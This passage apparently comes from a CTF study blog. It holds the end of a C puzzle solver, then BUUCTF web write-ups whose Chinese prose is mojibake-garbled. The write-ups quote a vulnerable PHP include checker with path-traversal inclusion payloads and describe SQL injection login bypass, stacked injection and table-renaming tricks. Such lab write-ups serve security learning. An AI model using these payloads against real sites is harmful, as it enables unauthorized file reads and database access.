class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> c[<span class="number">2</span>][<span class="number">5</span>]= &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;, min1 = <span class="number">999</span>, t;</span><br><span class="line"><span class="keyword">char</span> Map[<span class="number">16</span>][<span class="number">16</span>];</span><br><span class="line"><span class="keyword">char</span> ans[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">to_hex</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt;= <span class="number">10</span> ? a+<span class="number">55</span>:a+<span class="number">48</span>;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">turn</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> dx = x + c[<span class="number">0</span>][i];</span><br><span class="line">        <span class="keyword">int</span> dy = y + c[<span class="number">1</span>][i];</span><br><span class="line">        <span class="keyword">if</span>(dx &lt; <span class="number">0</span> || dy &lt; <span class="number">0</span> || dx &gt;= <span class="number">16</span> || dy &gt;= <span class="number">16</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">        Map[dx][dy] ^= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        <span class="keyword">if</span>(Map[<span class="number">15</span>][i] == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s &gt; <span class="number">107</span>)<span class="comment">//å‰ªæ </span></span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(y == <span class="number">16</span>)<span class="comment">//å‰ªæ </span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span>(x &gt;= <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)</span><br><span class="line">    <span class="keyword">if</span>(Map[x<span class="number">-1</span>][k] != <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">y = <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(x == <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(check())</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(ans);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x &gt;= <span class="number">1</span>)<span class="comment">//å‰ªæ </span></span><br><span class="line"><span class="keyword">if</span>(Map[x<span class="number">-1</span>][y] == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">goto</span> next;</span><br><span class="line"></span><br><span class="line"><span class="built_in">turn</span>(x, y);<span class="comment">//ç¿»è½¬ </span></span><br><span class="line"></span><br><span class="line">ans[<span class="number">2</span>*s] = to_hex(y), ans[<span class="number">2</span>*s+<span class="number">1</span>] = to_hex(x), ans[<span class="number">2</span>*s+<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">puts</span>(ans);</span><br><span class="line"><span class="comment">//printf("%d\n", s);</span></span><br><span class="line"></span><br><span class="line">dfs(x, y+<span class="number">1</span>, s+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">turn</span>(x, y);<span class="comment">//å›æº¯ </span></span><br><span class="line">next:</span><br><span class="line">ans[<span class="number">2</span>*s] = <span class="number">0</span>, ans[<span class="number">2</span>*s+<span class="number">1</span>] = <span class="number">0</span>, ans[<span class="number">2</span>*s+<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    dfs(x, y+<span class="number">1</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;Map[i][j]);</span><br><span class="line">    dfs(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(min1 &lt;= <span class="number">16</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//printf("%d\n", min1);</span></span><br><span class="line">        <span class="comment">//puts(ans);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Impossible\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸºæœ¬åŠŸè¿˜æ˜¯ä¸èƒ½ä¸¢ã€‚</p><h2 id="Crackme1"><a href="#Crackme1" class="headerlink" title="Crackme1"></a>Crackme1</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webå­¦ä¹ ä¹‹åˆ·é¢˜</title>
      <link href="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/"/>
      <url>/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>ä»å„å¤„webé¢˜å­¦ä¹ ã€‚</p><a id="more"></a><h2 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h2><h3 id="WarmUp"><a href="#WarmUp" class="headerlink" title="WarmUp"></a>WarmUp</h3><p>ä»æ³¨é‡Šä¸­çœ‹åˆ°source.phpï¼Œå°è¯•è®¿é—®ï¼Œè·å–æºä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨æºä»£ç ä¸­åˆçœ‹åˆ°äº†hint.phpï¼Œè‡ªç„¶çš„åˆå»è®¿é—®çœ‹çœ‹ã€‚æç¤ºflagåœ¨ffffllllaaaaggggæ–‡ä»¶ä¸­ï¼Œå¯æ€ä¹ˆåˆ°è¾¾å‘¢ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210415134759029.png" alt="image-20210415134759029"></p><p>ç„¶åå°±æ˜¯ç»†åˆ†ææºä»£ç ï¼š</p><p>å…ˆæŸ¥ä¸€ä¸‹ä»£ç ä¸­å‡ºç°ä½†ä¸ç†Ÿæ‚‰çš„å‡½æ•°ï¼š</p><blockquote><p><strong>in_array(search, array, type)</strong></p><ul><li>æœç´¢arrayä¸­æ˜¯å¦å­˜åœ¨searchå­—ç¬¦ä¸²ã€‚å¦‚æœ <em>search</em> å‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œä¸” <em>type</em> å‚æ•°è®¾ç½®ä¸º trueï¼Œåˆ™æœç´¢åŒºåˆ†å¤§å°å†™ã€‚</li></ul><p><strong>mb_substr ( string $str , int $start [, int $length = NULL [, string $encoding = mb_internal_encoding() ]] ) : string</strong></p><ul><li>å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œä¹‹å‰æˆ‘ä»¬å­¦è¿‡ substr() å‡½æ•°ï¼Œå®ƒåªé’ˆå¯¹è‹±æ–‡å­—ç¬¦ï¼Œå¦‚æœè¦åˆ†å‰²çš„ä¸­æ–‡æ–‡å­—åˆ™éœ€è¦ä½¿ç”¨ mb_substr()ã€‚</li></ul><p><strong>mb_strpos (haystack , needle )</strong></p><ul><li>haystackï¼šè¦è¢«æ£€æŸ¥çš„å­—ç¬¦ä¸²ï¼›needleï¼šè¦æœç´¢çš„å­—ç¬¦ä¸²ã€‚æŸ¥æ‰¾å­—ç¬¦ä¸²needleåœ¨å­—ç¬¦ä¸²haystackä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®ã€‚</li></ul></blockquote><p>ä¹‹ååˆ†ææºä»£ç ï¼Œå…ˆæ£€æŸ¥äº†è¾“å…¥çš„fileå‚æ•°ï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œæ˜¯å­—ç¬¦ä¸²ï¼Œä¸”é€šè¿‡äº†checkFileå‡½æ•°æ£€æŸ¥ï¼Œåˆ™å°†æˆ‘ä»¬è¾“å…¥çš„fileå‚æ•°è¿›è¡Œæ–‡ä»¶åŒ…å«ã€‚ä»hint.phpçŸ¥é“äº†flagæ–‡ä»¶åå­—ï¼Œè¿™é‡Œåˆæœ‰includeï¼Œå…¶å®å°±å¯ä»¥å¾€æ–‡ä»¶åŒ…å«æ¼æ´è€ƒè™‘äº†ï¼Œå°†æˆ‘ä»¬çš„flagæ–‡ä»¶åŒ…å«åˆ°ç½‘é¡µä¸­ã€‚</p><p>ä»checkFileå‡½æ•°ä¸­åˆ†æçŸ¥é“ï¼Œè¦è¿”å›Trueçš„è¯ï¼Œæˆ‘ä»¬è¯·æ±‚çš„å‚æ•°å­—ç¬¦ä¸²é‡Œå¿…é¡»å¸¦æœ‰ç™½åå•çš„ä¸­çš„å­—ç¬¦ä¸²[â€˜source.phpâ€™, â€˜hint.phpâ€™]ä¸­ä¸€ä¸ªï¼Œç¬¬ä¸€æ¬¡æ˜¯ç›´æ¥æ¯”è¾ƒï¼Œç¬¬äºŒæ¬¡å–<strong>?</strong>ä¹‹å‰çš„å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œç¬¬ä¸‰æ¬¡å°†å…¶è¿›è¡Œä¸€æ¬¡urldecodeåå†å–<strong>?</strong>ä¹‹å‰çš„å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒã€‚è¦åˆ©ç”¨è¿™ä¸ªæ¼æ´æ¥åŒ…å«flagæ–‡ä»¶çš„è¯ï¼Œæ˜¾ç„¶ä¸æ˜¯èµ°ä¸€ä¸ªåˆ¤æ–­äº†ã€‚</p><p>åˆæ¥è§¦webï¼Œä¸æ‡‚çš„å¾ˆå¤šï¼Œç„¶åå°±æ˜¯å»çœ‹wpå­¦ä¹ äº†ã€‚</p><p>é¦–å…ˆçœ‹åˆ°å¤§å®¶çš„åšæ³•æœ‰2ç§ï¼š</p><p>1.ç›´æ¥èµ°ç¬¬äºŒä¸ªåˆ¤æ–­ï¼Œå¼€å§‹è¾“å…¥ä¸€ä¸ªç™½åå•ä¸­çš„å­—ç¬¦ä¸²ï¼Œç„¶åæ‹¼æ¥ä¸€ä¸ªè¦ç›¸å¯¹è·¯å¾„åˆ°è¾¾flagæ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>2.èµ°ç¬¬ä¸‰ä¸ªåˆ¤æ–­ï¼ŒåŒç¬¬ä¸€ä¸ªè¾“å…¥ï¼Œä½†å¯¹hint.phpåçš„é—®å·äºŒæ¬¡urlencodeï¼Œå› ä¸ºæµè§ˆå™¨è·å–åˆ°æˆ‘ä»¬è¾“å…¥çš„å‚æ•°åä¼šè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡urldecodeã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php%<span class="number">253</span>f/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ç§å†™æ³•çš„åŒºåˆ«å°±åœ¨äºæ˜¯å¦å¯¹é—®å·è¿›è¡Œurlencodeã€‚ä½†è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Œè¿™å…¶å®æ˜¯windowsä¸linuxç¯å¢ƒä¸åŒå¯¼è‡´çš„ã€‚</p><p>è¿™ä¸ªé¢˜æ¥è‡ªäºChaMd5å®‰å…¨å›¢é˜Ÿ2018å‘ç°çš„<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="noopener">phpmyadmin4.8.1åå°getshell</a>çš„LFIï¼Œå½“æ—¶å‘ç°è¿™ä¸ªæ¼æ´çš„ç¯å¢ƒæ˜¯windowsï¼Œè€Œè¿™ä¸ªé¢˜ç›®çš„ç¯å¢ƒæ˜¯linuxã€‚</p><p>åœ¨windowsä¸­ï¼Œ?æ˜¯ä¸€ä¸ªä¿ç•™å­—ç¬¦ï¼Œæ–‡ä»¶åä¸èƒ½åŒ…å«é—®å·ï¼Œå¦‚æœæˆ‘ä»¬çš„è·¯å¾„åŒ…å«äº†?ï¼Œè¿™å°†è¢«è§†ä¸ºä¸€ä¸ªæ— æ•ˆçš„è·¯å¾„ï¼Œæ‰€ä»¥è¦åˆ©ç”¨urlencodeå¯¹é—®å·è¿›è¡ŒäºŒæ¬¡ç¼–ç ï¼Œé¿å…åœ¨æœ€åçš„åŒ…å«è·¯å¾„ä¸­å‡ºç°?å·ï¼Œè€Œåˆåœ¨ç¬¬ä¸‰æ¬¡æ¯”è¾ƒæ—¶ç»è¿‡è§£ç åè¿›è¡Œæ¯”è¾ƒçš„æ˜¯é—®å·ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210415172253830.png" alt="image-20210415172253830"></p><p>è€Œåœ¨linuxä¸­ï¼Œä¸€ä¸ªæ–‡ä»¶åä¸­æ˜¯å¯ä»¥æœ‰é—®å·çš„ã€‚</p><p>è¿™ä¸ªé¢˜ç”¨includeåŒ…å«æ—¶ï¼Œä¹Ÿæ˜¯æŠŠç¬¬ä¸€ä¸ª/ä¹‹å‰çš„å†…å®¹çœ‹åšä¸ªæ–‡ä»¶ç›®å½•äº†ã€‚å³<strong>hint.php?</strong>çœ‹æˆä¸€ä¸ªç›®å½•ã€‚</p><p>æ‰€ä»¥æœ¬é¢˜è¦æ˜¯åœ¨windowsç¯å¢ƒä¸‹çš„è¯ï¼Œå°±å¿…é¡»é€šè¿‡ç¬¬ä¸‰ä¸ªåˆ¤æ–­ï¼Œè¿›è¡ŒäºŒæ¬¡urlencodeæ‰èƒ½æ‰“é€šã€‚</p><p>æœ€åï¼Œè¿™ä¸ªincludeï¼Œå¯ä»¥è¿™æ ·æ— çº¿åŒ…å«ä¸‹å»å—ã€‚ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210415172913575.png" alt="image-20210415172913575"></p><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h3><p>ä»é¢˜ç›®åå­—å¯ä»¥çœ‹å‡ºè€ƒç‚¹æ˜¯sqlæ³¨å…¥ã€‚</p><p>é¦–å…ˆæµ‹è¯•çœ‹ä¸€ä¸‹sqlæ³¨å…¥ç±»å‹å’Œå¼•å·é—­åˆç±»å‹ï¼š<br>è¾“å…¥ç”¨æˆ·åï¼š1â€™ï¼Œå¯†ç ï¼š222ï¼Œä»æŠ¥é”™çœ‹å‡ºå•å¼•å·é—­åˆã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413221249767.png" alt="image-20210413221249767"></p><p>é—­åˆå¼•å·ï¼Œæ„é€ æ°¸çœŸå°è¯•ç™»é™†ï¼š</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413221429789.png" alt="image-20210413221429789"></p><p>ç™»å½•æˆåŠŸï¼Œç›´æ¥çœ‹åˆ°flagã€‚</p><h3 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h3><p>é¦–å…ˆï¼Œè¿˜æ˜¯æŒ‰ç…§ä¹‹å‰åšè¿‡çš„ä¸€ä¸ªsqlæ³¨å…¥å­¦åˆ°çš„ï¼Œæµ‹è¯•ä¸€ä¸‹æ˜¯å¦æœ‰æ³¨å…¥ä¸å¼•å·é—­åˆç±»å‹ã€‚</p><p>å¯ä»¥çŸ¥é“æ˜¯å•å¼•å·é—­åˆï¼š<br><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210409230543339.png" alt="image-20210409230543339"></p><p>æµ‹è¯•ä¸€ä¸‹æ•°æ®åº“ä¸å‰ç«¯æ˜¾ç¤ºçš„é€šé“ï¼šå‘ç°å¯¹ç›¸å…³æŸ¥è¯¢æŒ‡ä»¤çš„å¤§å°å†™éƒ½è¿›è¡Œäº†è¿‡æ»¤ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210409230808679.png" alt="image-20210409230808679"></p><p>ä¸ºäº†å¤šæ”¶é›†ä¿¡æ¯ï¼Œæ¥ä¸‹æ¥å†å°è¯•ä½¿ç”¨order by æ¥è·å¾—åˆ—æ•°ï¼Œåœ¨ä»¥ç¬¬ä¸€åˆ—ä¸ç¬¬äºŒåˆ—æ’åºæ—¶æ­£å¸¸è¾“å‡ºï¼Œä½†ç¬¬ä¸‰åˆ—æŠ¥é”™ï¼Œè¯´æ˜æœ‰2åˆ—ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413183501418.png" alt="image-20210413183501418"></p><p>â€‹    </p><p>ç„¶åç»§ç»­å°è¯•æŠ¥é”™æ³¨å…¥æ”¶é›†ä¿¡æ¯ï¼Œæœ‰<strong>updatexml</strong>ä¸<strong>extractvalue</strong>ï¼Œç”±ä¸Šé¢çŸ¥é“ï¼Œè¿™é‡Œè¿‡æ»¤äº†updateï¼Œæ‰€ä»¥ä½¿ç”¨extractvalueï¼š</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413191438306.png" alt="image-20210413191438306"></p><p>è¿™æ—¶å€™å³æ—¶å¾—åˆ°äº†ä¸Šé¢çš„ä¿¡æ¯ï¼Œä½†åˆæ€ä¹ˆåˆ©ç”¨å‘¢ã€‚ã€‚</p><p>å †å æ³¨å…¥ï¼Œä¸€æ¬¡æ‰§è¡Œå¤šæ¡ç”± ; åˆ†éš”çš„æŒ‡ä»¤ã€‚</p><p>æŸ¥è¯¢å½“å‰æ­£åœ¨ä½¿ç”¨è¿‡çš„æ•°æ®åº“çš„è¡¨ï¼š<br><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413191836676.png" alt="image-20210413191836676"></p><p>2ä¸ªè¡¨ï¼Œç»§ç»­æŸ¥è¯¢ä¸€ä¸‹ä»–ä»¬çš„å­—æ®µï¼Œçœ‹åˆ°flagå­—æ®µï¼š<br><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413192003223.png" alt="image-20210413192003223"></p><p>é—®é¢˜åˆæ¥äº†ï¼Œä¸èƒ½ä½¿ç”¨selectè¯­å¥ï¼Œé‚£è¿™é‡Œå¦‚ä½•æŸ¥è¯¢å­—æ®µçš„å€¼å‘¢ã€‚ã€‚</p><p><strong>ç¬¬ä¸€ä¸ªæ–¹æ³•ï¼šä½¿ç”¨<a href="https://blog.csdn.net/JesseYoung/article/details/40785137?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">mysqlæŸ¥è¯¢è¯­å¥-handler</a></strong></p><p>é¦–å…ˆæ‰“å¼€ä¸€ä¸ªå¥æŸ„ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> handler_table <span class="keyword">open</span>;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹è¡¨æ•°æ®ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> handler_table <span class="keyword">read</span> <span class="keyword">first</span>;</span><br><span class="line"><span class="keyword">handler</span> handler_table <span class="keyword">read</span> <span class="keyword">next</span>;</span><br></pre></td></tr></table></figure><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413193146361.png" alt="image-20210413193146361"></p><p><strong>ç¬¬äºŒç§æ–¹æ³•ï¼šå› ä¸ºæ²¡æœ‰ç¦ç”¨renameä¸alertï¼Œæ‰€ä»¥å¯ä»¥ä¿®æ”¹è¡¨ç»“æ„ã€‚</strong></p><p>å› ä¸ºæœ‰ä¸€ä¸ªé»˜è®¤è¡¨wordsï¼Œæˆ‘ä»¬è¾“å…¥çš„injectå‚æ•°ä¹Ÿæ˜¯ä¼ å…¥å…¶ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†å­˜æ”¾flagçš„è¡¨æ”¹ä¸ºwordsï¼Œå¹¶ä¿®æ”¹flagå­—æ®µä¸ºidå­—æ®µæˆ–è€…åŠ å…¥idå­—æ®µï¼Œæœ€åé€šè¿‡ä¸‡èƒ½å¯†ç 